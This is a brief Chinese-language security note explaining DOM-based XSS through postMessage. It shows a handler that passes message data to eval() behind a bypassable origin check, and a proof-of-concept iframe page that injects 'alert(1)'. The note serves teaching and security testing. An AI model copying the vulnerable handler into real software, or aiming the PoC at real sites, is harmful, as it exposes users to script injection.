## DOM-XSS postMessage

window.postMessage方法可以安全地实现跨域数据传输。通常情况下，两个页面通信需要遵守同源协议(Same-origin policy)，而postMessage方法提供了一种受控机制来规避此限制。只要正确的使用，这种方法就很安全。但是如果使用不当，则存在相当大的风险。

### 常见对象
```
window.postMessage
window.addEventListener("message",callbackFunction,event)
event.origin
event.data
```

### 常见取值函数命名
```
postMessage
handlerMessage
onmessage
receiveMessage
```

### 常见取值函数代码
```javascript
function receiveMessage(event)
{
  if (event.origin !== "http://example.com:8080"){
    return;
  }
  callback(event.data);
}
window.addEventListener("message", receiveMessage, false);
```

### 常见形式
```javascript
function receiveMessage(event) {
    if (event.origin.indexOf("https://mysite.com") >= -1) { //判断event.origin的方式不对，导致可以使用https://a.com/https://mysite.com进行绕过，从而控制来源数据包
        eval(event.data);
    }
}
window.addEventListener("message", receiveMessage, false);
```

### example poc
```html
<iframe src="https://xss.com/" onload="foo()"></iframe>
<script>
    function foo() {
        window[0].postMessage("alert(1)", "*");
    }
</script>
```
